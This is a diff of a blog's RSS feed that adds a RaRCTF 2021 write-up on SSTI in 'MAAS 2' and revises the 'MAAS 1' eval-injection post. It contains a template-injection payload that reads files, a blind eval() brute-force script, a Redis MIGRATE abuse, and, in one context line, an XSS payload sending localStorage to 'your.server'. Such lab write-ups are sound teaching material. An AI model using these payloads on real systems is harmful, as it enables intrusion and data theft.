@@ -5,8 +5,117 @@
         <description>Recent content in Posts on Jam ⇆ Vie</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Mon, 09 Aug 2021 13:49:21 -0700</lastBuildDate>
+        <lastBuildDate>Fri, 20 Aug 2021 13:49:21 -0700</lastBuildDate>
         <atom:link href="https://jamvie.net/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>RaRCTF 2021: MAAS 2 &#43; Unintended Solutions</title>
+            <link>https://jamvie.net/posts/2021/08/rarctf-2021-maas-2-unintended-solutions/</link>
+            <pubDate>Fri, 20 Aug 2021 13:49:21 -0700</pubDate>
+            
+            <guid>https://jamvie.net/posts/2021/08/rarctf-2021-maas-2-unintended-solutions/</guid>
+            <description>MAAS 2 // Notes Source was the same from MAAS 1 (and will be the same for MAAS 3). MAAS 2 involved the &amp;lsquo;notes&amp;rsquo; part of MAAS, where you are prompted to register a user and afterwards add key:val attributes to yourself, give yourself a bio, or transfer key:value attributes to another user.
+The provided source has some interesting code:
+notes/app.py
+@app.route(&amp;#39;/useraction&amp;#39;, methods=[&amp;#34;POST&amp;#34;]) def useraction(): mode = request.form.get(&amp;#34;mode&amp;#34;) username = request.</description>
+            <content type="html"><![CDATA[<h2 id="maas-2--notes">MAAS 2 // Notes</h2>
+<p>Source was the same from MAAS 1 (and will be the same for MAAS 3). MAAS 2 involved the &lsquo;notes&rsquo; part of MAAS, where you are prompted to register a user and afterwards add key:val attributes to yourself, give yourself a bio, or transfer key:value attributes to another user.</p>
+<p>The provided source has some interesting code:</p>
+<p><em>notes/app.py</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/useraction&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">useraction</span>():
+    mode <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;mode&#34;</span>)
+    username <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;username&#34;</span>)
+    <span style="color:#66d9ef">if</span> mode <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;register&#34;</span>:
+        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://redis_userdata:5000/adduser&#39;</span>)
+        port <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>text)
+        red <span style="color:#f92672">=</span> redis<span style="color:#f92672">.</span>Redis(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;redis_users&#34;</span>)
+        red<span style="color:#f92672">.</span>set(username, port)
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">elif</span> mode <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;adddata&#34;</span>:
+        red <span style="color:#f92672">=</span> redis<span style="color:#f92672">.</span>Redis(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;redis_users&#34;</span>)
+        port <span style="color:#f92672">=</span> red<span style="color:#f92672">.</span>get(username)<span style="color:#f92672">.</span>decode()
+        requests<span style="color:#f92672">.</span>post(f<span style="color:#e6db74">&#34;http://redis_userdata:5000/putuser/{port}&#34;</span>, json<span style="color:#f92672">=</span>{
+            request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;key&#34;</span>): request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;value&#34;</span>)
+        })
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">elif</span> mode <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;getdata&#34;</span>:
+        red <span style="color:#f92672">=</span> redis<span style="color:#f92672">.</span>Redis(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;redis_users&#34;</span>)
+        port <span style="color:#f92672">=</span> red<span style="color:#f92672">.</span>get(username)<span style="color:#f92672">.</span>decode()
+        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(f<span style="color:#e6db74">&#34;http://redis_userdata:5000/getuser/{port}&#34;</span>)
+        <span style="color:#66d9ef">return</span> jsonify(r<span style="color:#f92672">.</span>json())
+    <span style="color:#66d9ef">elif</span> mode <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;bioadd&#34;</span>:
+        bio <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;bio&#34;</span>)
+        bio<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;.&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;_&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>\
+            replace(<span style="color:#e6db74">&#34;{&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;}&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>\
+            replace(<span style="color:#e6db74">&#34;(&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;)&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>\
+            replace(<span style="color:#e6db74">&#34;|&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+
+        bio <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>sub(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;\[\[([^\[\]]+)\]\]&#39;</span>, <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;{{data[&#34;\g&lt;1&gt;&#34;]}}&#39;</span>, bio)
+        red <span style="color:#f92672">=</span> redis<span style="color:#f92672">.</span>Redis(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;redis_users&#34;</span>)
+        port <span style="color:#f92672">=</span> red<span style="color:#f92672">.</span>get(username)<span style="color:#f92672">.</span>decode()
+        requests<span style="color:#f92672">.</span>post(f<span style="color:#e6db74">&#34;http://redis_userdata:5000/bio/{port}&#34;</span>, json<span style="color:#f92672">=</span>{
+            <span style="color:#e6db74">&#34;bio&#34;</span>: bio
+        })
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">elif</span> mode <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;bioget&#34;</span>:
+        red <span style="color:#f92672">=</span> redis<span style="color:#f92672">.</span>Redis(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;redis_users&#34;</span>)
+        port <span style="color:#f92672">=</span> red<span style="color:#f92672">.</span>get(username)<span style="color:#f92672">.</span>decode()
+        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(f<span style="color:#e6db74">&#34;http://redis_userdata:5000/bio/{port}&#34;</span>)
+        <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>text
+    <span style="color:#66d9ef">elif</span> mode <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;keytransfer&#34;</span>:
+        red <span style="color:#f92672">=</span> redis<span style="color:#f92672">.</span>Redis(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;redis_users&#34;</span>)
+        port <span style="color:#f92672">=</span> red<span style="color:#f92672">.</span>get(username)<span style="color:#f92672">.</span>decode()
+        red2 <span style="color:#f92672">=</span> redis<span style="color:#f92672">.</span>Redis(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;redis_userdata&#34;</span>,
+                           port<span style="color:#f92672">=</span>int(port))
+        red2<span style="color:#f92672">.</span>migrate(request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;host&#34;</span>),
+                     request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;port&#34;</span>),
+                     [request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;key&#34;</span>)],
+                     <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1000</span>,
+                     copy<span style="color:#f92672">=</span>True, replace<span style="color:#f92672">=</span>True)
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>
+
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/render&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">render_bio</span>():
+    data <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>json<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;data&#39;</span>)
+    <span style="color:#66d9ef">if</span> data <span style="color:#f92672">is</span> None:
+        data <span style="color:#f92672">=</span> {}
+    <span style="color:#66d9ef">return</span> render_template_string(request<span style="color:#f92672">.</span>json<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;bio&#39;</span>), data<span style="color:#f92672">=</span>data)
+</code></pre></div><p>The relevant parts are when mode is equal to <code>bioadd</code>. There&rsquo;s a pretty hefty sanitizer in play that removes all relevant characters required for an SSTI. This is further supplemented by the endpoint to <code>/render</code>, which takes your input and passes it into <code>render_template_string</code>. TL;DR: <strong>S</strong>erver-<strong>S</strong>ide <strong>T</strong>emplate <strong>I</strong>njection involves injecting code into template expressions that are evaluated on the server. Essentially, if you have an app vulnerable to SSTI, then you should be able to inject any expression into {{double curly brackets}} and that expression would be evaluated.</p>
+<p>But, this is a sanitizer function, and it does specifically remove the <code>{}</code> characters, so we would be out of luck for SSTI. Out of sanity, I double checked that {{template expressions}} were disallowed and tried a basic SSTI payload such as {{7*7}}.</p>
+
+    <img src="/images/rarctf_maas2ssti.png"  alt="satisfies all checks"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Oh, wait a second. <em>The sanitization filter isn&rsquo;t actually applied to our input!</em> We get a quick and easy SSTI vulnerability.</p>
+<p>We can modify our payload from the previous MAAS 1 to better suit a template expression:</p>
+<pre><code>{{request.application.__globals__.__builtins__.open('../flag.txt','r').read(-1)}}
+</code></pre><p>Update your bio as this and the flag will be loaded for you!</p>
+
+    <img src="/images/rarctf_maas2flag.png"  alt="satisfies all checks"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>While this is the unintended solution, the intended one did involve throwing an SSTI payload over &ldquo;behind&rdquo; the filtering by manipulating the redis container that would contain the user objects.</p>
+<p>If the filter was actually applied, you would be forced to instead leverage the application&rsquo;s key transfer feature to force a key-transfer connection to a Redis container at port 6379 - which is the defualt port of the Redis server.</p>
+<p>The code for the keytransfer actually calls the Redis command &ldquo;migrate&rdquo;:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">    <span style="color:#66d9ef">elif</span> mode <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;keytransfer&#34;</span>:
+        red <span style="color:#f92672">=</span> redis<span style="color:#f92672">.</span>Redis(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;redis_users&#34;</span>)
+        port <span style="color:#f92672">=</span> red<span style="color:#f92672">.</span>get(username)<span style="color:#f92672">.</span>decode()
+        red2 <span style="color:#f92672">=</span> redis<span style="color:#f92672">.</span>Redis(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;redis_userdata&#34;</span>,
+                           port<span style="color:#f92672">=</span>int(port))
+        red2<span style="color:#f92672">.</span>migrate(request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;host&#34;</span>),
+                     request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;port&#34;</span>),
+                     [request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;key&#34;</span>)],
+                     <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1000</span>,
+                     copy<span style="color:#f92672">=</span>True, replace<span style="color:#f92672">=</span>True)
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>
+</code></pre></div><p>And we can provide as a port argument the value 6379 to tell the Redis-cli server that the provided &ldquo;host&rdquo; argument should have their value changed to the &ldquo;key&rdquo; argument. Here, you would then be able to set a user&rsquo;s port as some arbitrary value that you can control, such as &ldquo;../bio&rdquo;. Get 2 users, perform a key transfer to the Redis-server to change one user&rsquo;s port to &ldquo;../bio&rdquo;, and then perform another key transfer to give a &ldquo;key&rdquo; called &ldquo;bio&rdquo; with the value being your SSTI payload, to the original user. The result after all these Redis manipulations should be the execution of your SSTI payload that would have completely avoided the filtering.</p>
+<p>You could, additionally, use your previous payload from MAAS 1 and take advantage of the challenge&rsquo;s improper network isolation issues to make internal calls to the MAAS 2 notes API. This was possible due to the fact that MAAS 1-3 were 3 different, linked docker containers that (unintended by the dev) could be interacted with from between docker containers. This &ldquo;sharing&rdquo; feature allowed you to reuse an attack vector in one challenge to request for resources from another challenge, like their flag. This could be done for any of the MAAS challenges. Interesting stuff!</p>
+<hr>
+<p>RaRCTF was a good CTF, and given how it appears to be team WinRaR&rsquo;s first CTF, I&rsquo;m thoroughly impressed by the quality of the challenges.</p>
+<p><strong>Vie</strong></p>
+]]></content>
+        </item>
         
         <item>
             <title>RaRCTF2021: Some simpler web probz</title>
@@ -41,8 +150,8 @@ link: javascript:fetch('your.server?fleg='%2B(window.localStorage.getItem(&quot;
         <span style="color:#66d9ef">return</span> (os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#34;uploads/&#34;</span>, res[<span style="color:#ae81ff">0</span>]))
 </code></pre></div><p>python&rsquo;s <code>os.path.join</code> is a unique thing: its purpose is to concat the provided parameters, appending one after the other with a <code>/</code> character in between. As an example, <code>os.path.join('foo','bar')</code> would produce <code>foo/bar</code>. However, specify an absolute filepath as a parameter, and everything before that string will be erased. So, <code>os.path.join('foo', '/bar')</code> would produce just <code>/bar</code>. We can use this knowledge to provide to the challenge a filename such as <code>//flag</code> which will resolve to retrieve the flag kept in the root directory of the docker container hosting the challenge.</p>
 <p>flag: <code>rarctf{4lw4y5_r34d_th3_d0c5_pr0p3rly!-71ed16}</code></p>
-<h2 id="maas-1calculator">MAAS 1//Calculator</h2>
-<p>The first part of &ldquo;Microservices as a Service&rdquo; was a challenge that involved improper use of the python function <code>eval()</code>.</p>
+<h2 id="maas-1--calculator">MAAS 1 // Calculator</h2>
+<p>The first part of &ldquo;Microservices as a Service&rdquo; was a challenge that involved improper use of the python function <code>eval()</code>. For those unaware, <code>eval()</code> takes as a parameter a string representing code. For example, <code>eval('print(&quot;hello&quot;)')</code> would return <code>hello</code> in your console. Obviously, not a very <em>safe</em> function to use.</p>
 <p>In the provided source, we see some very interesting code in <code>arithmetic/app.py</code>:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/arithmetic&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">arithmetic</span>():
@@ -67,12 +176,12 @@ link: javascript:fetch('your.server?fleg='%2B(window.localStorage.getItem(&quot;
             <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Result is not a number&#34;</span>
     <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">NameError</span>:
         <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Result is invalid&#34;</span>
-</code></pre></div><p>This would run when you perform any arithmetic action using the calculator. When using the calculator, if you try to do an addition formula like &ldquo;1+1&rdquo;, the returned result isn&rsquo;t 2, but &ldquo;11&rdquo;. Why is that?</p>
-<p>The program passes your code into <code>eval()</code>, but the result of that <code>eval()</code> isn&rsquo;t returned anywhere. If the eval&rsquo;d result was an integer, then the <em>string</em> that was passed as a parameter to <code>eval()</code> would be returned, hence why &ldquo;11&rdquo; is returned as the result of &ldquo;1+1&rdquo;. However, <code>eval()</code> is called nonetheless, and we can use this to our advantage.</p>
+</code></pre></div><p>This would run when you perform any arithmetic action using the calculator in the website. When using the calculator, if you try to do an addition formula like &ldquo;1+1&rdquo;, the returned result isn&rsquo;t 2, but &ldquo;11&rdquo;. Why is that?</p>
+<p>The program passes your code into <code>eval()</code> (in the <code>try</code> statement), but the result of that <code>eval()</code> isn&rsquo;t returned anywhere. If the eval&rsquo;d result was an integer, then the <em>string</em> that was passed as a parameter to <code>eval()</code> would be returned, hence why &ldquo;11&rdquo; is returned as the result of &ldquo;1+1&rdquo;. However, <code>eval()</code> is called nonetheless, and we can use this to our advantage.</p>
 <p>First and foremost, if the result of the eval was a number (int or float), then the string is returned. Else, &ldquo;Result is not a number&rdquo; or &ldquo;Result is invalid&rdquo; is returned. We could use this as a boolean condition with the following string:</p>
 <pre><code>eval(&quot;1 if (open('../flag.txt','r').read(-1).startswith('rarctf{')) else 'false'&quot;)
 </code></pre><p>We can instead put this as our &ldquo;arithmetic&rdquo; equation. Since the POST request made to the endpoint requires 2 params to be operated on, &ldquo;n1&rdquo; and &ldquo;n2&rdquo;, split this statement into 2 arbitrary halves and put 1 half into the &ldquo;n1&rdquo; param, and the other into the &ldquo;n2&rdquo; param.</p>
-<p>What this does is it calls <code>eval()</code> once more, but in this 2nd call we have more freedom to stipulate what can be evaluated. The param to the inner <code>eval</code> is just an if statement that returns the integer <code>1</code> if <code>(open('../flag.txt','r').read(-1).startswith('rarctf{'))</code> returns the boolean value true, or returns the string <code>'false'</code> if the statement returns the boolean value false.</p>
+<p>What this does is it calls <code>eval()</code> once more, but in this 2nd call we have more freedom to stipulate what can be evaluated. The param to the inner <code>eval()</code> is just an if statement that returns the integer <code>1</code> if <code>(open('../flag.txt','r').read(-1).startswith('rarctf{'))</code> returns the boolean value true, or returns the string <code>'false'</code> if the statement returns the boolean value false.</p>
 <p>Therefore, if the contents of <code>flag.txt</code> start with the prefix &ldquo;rarctf{&rdquo;, then the <code>eval()</code> functions will return 1, and the maas program would return the whole string as a result. If it doesn&rsquo;t start with that prefix, then the <code>eval()</code> functions would return the string &lsquo;false&rsquo; and the if statement that checks the <code>res_type</code> would not return our string. From here, we can just continue to add characters to the prefix to brute-force the value of the flag that way: if we get back our string, then the character we guessed is in the flag. If we get back either &ldquo;Result is not a number&rdquo; or &ldquo;Result is invalid&rdquo; (or just if the response text has the keyword &ldquo;Result&rdquo;), then the character we guessed is not in the flag.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> requests
 
@@ -85,18 +194,20 @@ prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;rar
 <span style="color:#75715e">#I just chose 40 arbitrarily. If the flag was longer, I would have increased the range.</span>
 <span style="color:#66d9ef">for</span> index <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">40</span>):
     <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> alphabet:
-        <span style="color:#75715e">#our string. We will bruteforce the flag character by character. By convention, we at least know the flag starts with &#39;rarctf{&#39;</span>
+        <span style="color:#75715e"># It uses the python builtin function open to retrieve the contents of /flag.txt, then reads it</span>
+        <span style="color:#75715e"># if the contents of said flag.txt contain the prefix (and we add the current character after the prefix), it returns true</span>
         req <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;eval(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">1 if (open(&#39;../flag.txt&#39;,&#39;r&#39;).read(-1).startswith(&#39;&#34;</span> <span style="color:#f92672">+</span> prefix <span style="color:#f92672">+</span> c <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;)) else &#39;false&#39;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>
-        <span style="color:#75715e">#I split the string between the n1 and n2 params arbitrarily. It doesnt matter how you split them.</span>
+        <span style="color:#75715e"># I split the string between the n1 and n2 params arbitrarily. It doesnt matter how you split them.</span>
         data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;mode&#34;</span>: <span style="color:#e6db74">&#34;arithmetic&#34;</span>, <span style="color:#e6db74">&#34;n1&#34;</span>: req, <span style="color:#e6db74">&#34;add&#34;</span>: <span style="color:#e6db74">&#34;+&#34;</span>, <span style="color:#e6db74">&#34;n2&#34;</span>: <span style="color:#e6db74">&#34;)&#34;</span>}
         resp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data)
-        <span style="color:#75715e">#if we dont find the word &#34;Result&#34; in the response to our request above, then that means the character we guessed is in the flag!</span>
+        <span style="color:#75715e"># If we dont find the word &#34;Result&#34; in the response to our request above, then that means the character we guessed is in the flag!</span>
         <span style="color:#66d9ef">if</span> (resp<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;Result&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">and</span> (resp<span style="color:#f92672">.</span>status_code <span style="color:#f92672">!=</span> <span style="color:#ae81ff">500</span>):
+            <span style="color:#75715e"># Add the correctly guessed character to the string amd move on to the next char</span>
             prefix <span style="color:#f92672">+=</span> c
             <span style="color:#66d9ef">print</span>(prefix)
             <span style="color:#66d9ef">continue</span>
 </code></pre></div><p>flag: <code>rarctf{0v3rk1ll_4s_4_s3rv1c3_3fca0faa}</code></p>
-<p>part 2: coming soon :)</p>
+<p><a href="/posts/2021/08/rarctf-2-maas-2-unintended-solutions/">Part 2!</a></p>
 <p><strong>Vie</strong></p>
 ]]></content>
         </item>
